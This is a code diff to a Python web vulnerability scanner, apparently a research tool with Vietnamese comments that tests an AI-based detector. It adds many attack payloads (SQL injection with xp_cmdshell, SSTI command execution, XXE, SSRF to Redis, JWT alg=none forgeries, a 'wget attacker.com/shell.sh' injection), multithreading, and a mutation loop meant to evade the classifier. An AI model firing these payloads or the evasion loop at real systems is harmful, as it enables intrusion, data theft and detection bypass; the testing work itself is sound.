@@ -26,6 +26,7 @@ from html.parser import HTMLParser
 from urllib.parse import urljoin, urlparse, urlencode, quote, quote_plus
 import random
 import copy
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from dotenv import load_dotenv
 from attack_log import AttackLogger
 
@@ -51,6 +52,7 @@ MAX_LEN = 150
 ORACLE_THRESHOLD = 75.0   # Ngưỡng trigger mutation (% confidence)
 EVASION_THRESHOLD = 50.0  # Nếu conf < giá trị này → coi là evasive
 MAX_MUTATION_ROUNDS = 15  # Greedy hill climbing iterations
+MAX_WORKERS = 4           # Số luồng song song khi tấn công
 
 # ===== COLOR OUTPUT =====
 class Color:
@@ -109,6 +111,11 @@ ATTACK_PAYLOADS = {
         "1; DROP TABLE users--",
         "' OR 1=1#",
         "1' UNION SELECT null,null,null,null--",
+        "' OR 'x'='x",
+        "admin' OR 1=1#",
+        "') OR ('1'='1",
+        "'; EXEC xp_cmdshell('dir');--",
+        "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL#"
     ],
     "XSS": [
         "<script>alert('XSS')</script>",
@@ -117,6 +124,10 @@ ATTACK_PAYLOADS = {
         "\"><script>alert(document.cookie)</script>",
         "javascript:alert(1)",
         "<body onload=alert('XSS')>",
+        "'-prompt(8)-'",
+        "<iframe src=\"javascript:alert(1)\"></iframe>",
+        "<math><mi>//</mi><script>alert(1)</script></math>",
+        "\"><img src=1 onerror=confirm(1)>"
     ],
     "Command Injection": [
         "127.0.0.1; whoami",
@@ -125,6 +136,10 @@ ATTACK_PAYLOADS = {
         "$(whoami)",
         "`id`",
         "127.0.0.1; ls -la /",
+        "ping -c 10 127.0.0.1",
+        "| net user",
+        "& type C:\\Windows\\win.ini",
+        ";wget http://attacker.com/shell.sh"
     ],
     "Path Traversal": [
         "../../../../etc/passwd",
@@ -133,6 +148,8 @@ ATTACK_PAYLOADS = {
         "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
         "/etc/shadow",
         "..%252f..%252f..%252fetc%252fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "C:\\boot.ini"
     ],
     "SSRF": [
         "http://169.254.169.254/latest/meta-data/",
@@ -140,6 +157,8 @@ ATTACK_PAYLOADS = {
         "http://localhost:3306",
         "http://0.0.0.0:8080",
         "http://[::1]:80",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"
     ],
     "CSRF": [
         "http://attacker.com/csrf/transfer",
@@ -147,6 +166,54 @@ ATTACK_PAYLOADS = {
         "<img src='http://localhost:5170/transfer?to=hacker&amount=9000'>",
         "<html><body><script>fetch('/transfer?to=hacker&amount=9999');</script></body></html>",
     ],
+    "SSTI": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "{{config.items()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "*{7*7}",
+        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+        "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        "{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}"
+    ],
+    "NoSQLi": [
+        '{"$gt": ""}',
+        '{"$ne": null}',
+        "|| 1==1",
+        "true, $where: '1 == 1'",
+        '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
+        '{"$regex": ".*"}',
+        '{"$in": ["admin", "root"]}',
+        '{"$exists": true}',
+        "'; sleep(5000); '",
+        '{"$ne": 1}'
+    ],
+    "XXE": [
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/shadow'>]><root>&test;</root>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/ping'>]><foo>&xxe;</foo>",
+        "<!DOCTYPE replace [<!ENTITY ent SYSTEM 'file:///c:/boot.ini'>]><root>&ent;</root>",
+        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'> %xxe;]>",
+        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>",
+        "<!DOCTYPE data SYSTEM \"http://attacker.com/xxe.dtd\"><data>&send;</data>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///proc/self/environ'>]><root>&test;</root>"
+    ],
+    "JWTAuth": [
+        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
+        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
+        "eyJhbGciOiJOT05FIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
+        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
+        "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature",
+        "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ."
+    ]
 }
 
 # Dấu hiệu tấn công thành công trong response
@@ -165,17 +232,20 @@ VULN_SIGNATURES = {
         r"<script[^>]*>alert\(",
         r"<img[^>]+onerror\s*=\s*alert",
         r"<svg[^>]+onload\s*=\s*alert",
+        r"prompt\(8\)",
     ],
     "Command Injection": [
         r"uid=\d+\(\w+\)\s+gid=\d+",
         r"root:x:0:0:root:/root:",
         r"(?m)^total \d+$\ndrwx",
         r"Windows IP Configuration",
+        r"Volume Serial Number",
     ],
     "Path Traversal": [
         r"root:x:0:0:root:/root:/bin/",
         r"\[extensions\]\s*\n.*MAPI=",
         r"daemon:x:\d+:\d+:daemon",
+        r"\[boot loader\]",
     ],
     "SSRF": [
         r"ami-id\s*:\s*ami-[a-f0-9]+",
@@ -185,6 +255,30 @@ VULN_SIGNATURES = {
         r"mysql_native_password",
         r"Kết quả fetch URL",
     ],
+    "CSRF": [
+        r"Chuyển tiền thành công",
+    ],
+    "SSTI": [
+        r"49",                           # 7*7
+        r"config\.items\(\)",
+        r"<class 'subprocess.Popen'>",
+    ],
+    "NoSQLi": [
+        r"MongoError",
+        r"Cast to ObjectId failed",
+        r"BSON",
+        r"NoSQL",
+    ],
+    "XXE": [
+        r"root:x:0:0:",
+        r"java\.io\.FileNotFoundException",
+        r"XML parser error",
+    ],
+    "JWTAuth": [
+        r"Welcome admin",
+        r"Invalid token",
+        r"JWT signature",
+    ]
 }
 
 # ===== PAYLOAD MUTATOR =====
@@ -436,6 +530,7 @@ class VulnerabilityScanner:
         self.start_time = None
         self.end_time = None
         self._attack_payloads = ATTACK_PAYLOADS  # Ban tham chieu mac dinh
+        self._stats_lock = __import__('threading').Lock()
         self.attack_logger = AttackLogger()  # SQLite attack log
         self.attack_logger.clear()           # Xoa log cu moi lan scan moi
         # Stats for adversarial analysis + security metrics
@@ -805,134 +900,154 @@ class VulnerabilityScanner:
 
     def run_attacks(self):
         """Phase 2: Adversarial Greedy Hill Climbing — guided mutation loop."""
-        print(f"\n{Color.RED}[Phase 2]  Bat dau Adversarial Hill Climbing (max {MAX_MUTATION_ROUNDS} rounds)...{Color.END}")
-        total_tests = 0
         mutator = PayloadMutator()
+        
+        def attack_single(task):
+            """Một unit công việc: (endpoint, attack_type, payload)"""
+            ep, attack_type, payload = task
+            
+            with self._stats_lock:
+                self.adv_stats['total_original'] += 1
 
-        for ep in self.endpoints:
-            path = urlparse(ep['url']).path
-            print(f"\n  {Color.BOLD}-- Tan cong: {ep['method']} {path}?{ep['param']}=... --{Color.END}")
+            # ---- Oracle check ----
+            detected, orig_label, orig_conf = self.ai.is_detected(payload)
 
-            for attack_type, static_payloads in self._attack_payloads.items():
-                for payload in static_payloads:
-                    self.adv_stats['total_original'] += 1
-                    total_tests += 1
+            mutation_result = None
+            model_evaded = False
+            best_payload = payload
+            best_strategy = 'original'
+            rounds_used = 0
+            mutation_time = 0.0
 
-                    # ---- Step 1: Oracle check ----
-                    detected, orig_label, orig_conf = self.ai.is_detected(payload)
+            if detected:
+                with self._stats_lock:
+                    self.adv_stats['model_detected'] += 1
+                t_start = time.time()
+                mutation_result = mutator.guided_mutate(
+                    payload, self.ai.classify, MAX_MUTATION_ROUNDS
+                )
+                mutation_time = time.time() - t_start
+                
+                with self._stats_lock:
+                    self.adv_stats['mutations_tried'] += mutation_result['rounds_used']
+                    rounds_used = mutation_result['rounds_used']
+                    best_payload = mutation_result['final_payload']
 
-                    mutation_result = None
-                    model_evaded = False
-                    best_payload = payload
-                    best_strategy = 'original'
-                    rounds_used = 0
-                    mutation_time = 0.0
+                    for s in mutation_result['strategies_used']:
+                        self.adv_stats['mutation_effectiveness'].setdefault(s, 0)
+                        self.adv_stats['mutation_effectiveness'][s] += 1
 
-                    if detected:
-                        self.adv_stats['model_detected'] += 1
+                    if mutation_result['success']:
+                        model_evaded = True
+                        self.adv_stats['evasions_found'] += 1
+                        self.adv_stats['time_to_bypass_list'].append(mutation_time)
+                        self.adv_stats['rounds_to_bypass_list'].append(rounds_used)
+                        best_strategy = '->'.join(mutation_result['strategies_used'])
+                        self.adv_stats['bypass_payloads'].append({
+                            'attack_type': attack_type,
+                            'original': payload,
+                            'bypassed': best_payload,
+                            'conf_original': orig_conf,
+                            'conf_final': mutation_result['final_confidence'],
+                            'strategy_chain': best_strategy,
+                            'rounds': rounds_used,
+                            'time': mutation_time,
+                        })
 
-                        # ---- Step 2: Guided Hill Climbing ----
-                        t_start = time.time()
-                        mutation_result = mutator.guided_mutate(
-                            payload, self.ai.classify, MAX_MUTATION_ROUNDS
-                        )
-                        mutation_time = time.time() - t_start
+            # ---- Fire original ----
+            t_fire = time.time()
+            result = self.attack_endpoint(ep, attack_type, payload)
+            fire_time = time.time() - t_fire
+            result.update({
+                'original_confidence': orig_conf,
+                'oracle_detected': detected,
+                'model_label': orig_label,
+            })
+            
+            with self._stats_lock:
+                self.attack_logger.log(
+                    original_payload=payload,
+                    mutated_payload=payload,
+                    mutation_type='original',
+                    attempt_number=0,
+                    detected_by='ai' if detected else 'none',
+                    result='blocked' if result.get('status_code') in (403, 429) else 'bypass',
+                    response_time=fire_time,
+                )
 
-                        self.adv_stats['mutations_tried'] += mutation_result['rounds_used']
-                        rounds_used = mutation_result['rounds_used']
-                        best_payload = mutation_result['final_payload']
-
-                        # Track strategy effectiveness
-                        for s in mutation_result['strategies_used']:
-                            self.adv_stats['mutation_effectiveness'].setdefault(s, 0)
-                            self.adv_stats['mutation_effectiveness'][s] += 1
-
-                        if mutation_result['success']:
-                            model_evaded = True
-                            self.adv_stats['evasions_found'] += 1
-                            self.adv_stats['time_to_bypass_list'].append(mutation_time)
-                            self.adv_stats['rounds_to_bypass_list'].append(rounds_used)
-                            best_strategy = '->'.join(mutation_result['strategies_used'])
-
-                            # Log bypass payload
-                            self.adv_stats['bypass_payloads'].append({
-                                'attack_type': attack_type,
-                                'original': payload,
-                                'bypassed': best_payload,
-                                'conf_original': orig_conf,
-                                'conf_final': mutation_result['final_confidence'],
-                                'strategy_chain': best_strategy,
-                                'rounds': rounds_used,
-                                'time': mutation_time,
-                            })
-
-                    # ---- Step 3: Fire original payload ----
-                    t_fire = time.time()
-                    result = self.attack_endpoint(ep, attack_type, payload)
-                    fire_time = time.time() - t_fire
-                    result.update({
-                        'original_confidence': orig_conf,
-                        'oracle_detected': detected,
-                        'model_label': orig_label,
-                    })
-
-                    # Log to SQLite — original payload
+            # ---- Fire evasive payload ----
+            if mutation_result and best_payload != payload:
+                t_fire2 = time.time()
+                evasive_result = self.attack_endpoint(ep, attack_type, best_payload)
+                fire_time2 = time.time() - t_fire2
+                status = evasive_result.get('status_code')
+                waf_blocked = status in (403, 429)
+                evasive_result.update({
+                    'original_confidence': orig_conf,
+                    'evasive_confidence': mutation_result['final_confidence'],
+                    'mutation_strategy': best_strategy,
+                    'mutation_rounds': rounds_used,
+                    'model_evaded': model_evaded,
+                    'waf_blocked': waf_blocked,
+                })
+                
+                with self._stats_lock:
+                    self.scan_results.append(evasive_result)
+                    if evasive_result.get('is_vulnerable'):
+                        self.vulnerabilities.append(evasive_result)
                     self.attack_logger.log(
                         original_payload=payload,
-                        mutated_payload=payload,
-                        mutation_type='original',
-                        attempt_number=0,
-                        detected_by='ai' if detected else 'none',
-                        result='blocked' if result.get('status_code') in (403, 429) else 'bypass',
-                        response_time=fire_time,
+                        mutated_payload=best_payload,
+                        mutation_type=best_strategy,
+                        attempt_number=rounds_used,
+                        detected_by='rule' if waf_blocked else ('ai' if not model_evaded else 'none'),
+                        result='blocked' if waf_blocked else 'bypass',
+                        response_time=fire_time2,
                     )
+                
+                if model_evaded and not waf_blocked:
+                    print(f"    {Color.MAGENTA}BYPASS [{best_strategy}] "
+                          f"conf {orig_conf:.0f}%->{mutation_result['final_confidence']:.0f}% "
+                          f"({rounds_used} rounds, {mutation_time:.2f}s){Color.END}")
+                elif model_evaded and waf_blocked:
+                    print(f"    {Color.YELLOW}MODEL WEAK [{best_strategy}] "
+                          f"evaded model but WAF rule caught it{Color.END}")
 
-                    # ---- Step 4: Fire best evasive payload if different ----
-                    if mutation_result and best_payload != payload:
-                        t_fire2 = time.time()
-                        evasive_result = self.attack_endpoint(ep, attack_type, best_payload)
-                        fire_time2 = time.time() - t_fire2
+            return result
 
-                        status = evasive_result.get('status_code')
-                        waf_blocked = status in (403, 429)
-                        evasive_result.update({
-                            'original_confidence': orig_conf,
-                            'evasive_confidence': mutation_result['final_confidence'],
-                            'mutation_strategy': best_strategy,
-                            'mutation_rounds': rounds_used,
-                            'model_evaded': model_evaded,
-                            'waf_blocked': waf_blocked,
-                        })
-                        self.scan_results.append(evasive_result)
-                        if evasive_result.get('is_vulnerable'):
-                            self.vulnerabilities.append(evasive_result)
+        # ---- Build task list ----
+        tasks = []
+        for ep in self.endpoints:
+            for attack_type, static_payloads in self._attack_payloads.items():
+                for payload in static_payloads:
+                    tasks.append((ep, attack_type, payload))
 
-                        # Log to SQLite — mutated payload
-                        self.attack_logger.log(
-                            original_payload=payload,
-                            mutated_payload=best_payload,
-                            mutation_type=best_strategy,
-                            attempt_number=rounds_used,
-                            detected_by='rule' if waf_blocked else ('ai' if not model_evaded else 'none'),
-                            result='blocked' if waf_blocked else 'bypass',
-                            response_time=fire_time2,
-                        )
+        total_tests = len(tasks)
+        print(f"\n{Color.RED}[Phase 2] ⚡ Adversarial Hill Climbing — "
+              f"{total_tests} tasks | {MAX_WORKERS} threads{Color.END}")
 
-                        # Print insight
-                        if model_evaded and not waf_blocked:
-                            print(f"    {Color.MAGENTA}BYPASS [{best_strategy}] "
-                                  f"conf {orig_conf:.0f}%->{mutation_result['final_confidence']:.0f}% "
-                                  f"({rounds_used} rounds, {mutation_time:.2f}s){Color.END}")
-                        elif model_evaded and waf_blocked:
-                            print(f"    {Color.YELLOW}MODEL WEAK [{best_strategy}] "
-                                  f"evaded model but WAF rule caught it{Color.END}")
+        # ---- Execute với ThreadPoolExecutor ----
+        completed = 0
+        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+            futures = {executor.submit(attack_single, task): task for task in tasks}
+            for future in as_completed(futures):
+                try:
+                    future.result()
+                except Exception as e:
+                    logger.warning(f"Task error: {e}")
+                completed += 1
+                if completed % 20 == 0:
+                    print(f"  {Color.CYAN}[{completed}/{total_tests}] đang quét...{Color.END}")
 
-            # ---- Summary per endpoint ----
-            ep_vulns = [v for v in self.vulnerabilities if v.get('endpoint') == ep['url'] and v.get('param') == ep['param']]
+        # ---- Per-endpoint summary ----
+        for ep in self.endpoints:
+            ep_vulns = [v for v in self.vulnerabilities
+                       if v.get('endpoint') == ep['url'] and v.get('param') == ep['param']]
+            path = urlparse(ep['url']).path
             if ep_vulns:
-                print(f"    {Color.RED}!! Endpoint nay co {len(ep_vulns)} lo hong!{Color.END}")
+                print(f"  {Color.RED}!! {path}?{ep['param']} — {len(ep_vulns)} lỗ hổng{Color.END}")
             else:
-                print(f"    {Color.GREEN}OK Endpoint nay an toan{Color.END}")
+                print(f"  {Color.GREEN}OK {path}?{ep['param']} — an toàn{Color.END}")
 
         # ---- Compute final security metrics ----
         stats = self.adv_stats
@@ -941,8 +1056,8 @@ class VulnerabilityScanner:
         if stats['total_original'] > 0:
             stats['attack_success_rate'] = len(self.vulnerabilities) / stats['total_original'] * 100
 
-        print(f"\n  Tong: {total_tests} payloads da gui, "
-              f"{Color.RED}{len(self.vulnerabilities)} lo hong{Color.END} phat hien")
+        print(f"\n  Tổng: {total_tests} payloads | "
+              f"{Color.RED}{len(self.vulnerabilities)} lỗ hổng{Color.END} phát hiện")
 
 
     # ----- Phase 3: Tạo báo cáo -----
